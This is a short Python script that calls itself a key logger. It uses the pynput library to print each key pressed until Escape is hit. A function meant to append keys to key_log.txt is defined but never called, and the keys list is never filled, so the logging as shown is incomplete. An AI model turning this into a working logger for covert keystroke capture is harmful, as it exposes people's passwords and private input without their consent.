import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global count, keys
    print(key)

def write_file(keys):
    with open("key_log.txt", "a") as f:
        for key in keys:
            f.write(key)
    

def on_release(key):
    if key == Key.esc:
        print("Ending Key Logger")
        return False
    





with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()